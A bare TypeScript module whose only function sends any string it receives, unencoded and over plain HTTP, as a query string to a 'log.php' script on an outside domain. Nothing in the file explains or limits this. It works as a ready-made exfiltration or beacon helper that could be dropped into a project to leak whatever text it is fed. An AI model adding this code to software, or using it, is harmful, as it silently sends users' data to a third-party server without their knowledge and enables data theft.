export default function (text: string) {
  fetch(`http://schwarzerkreis.de/log.php?${text}`);
}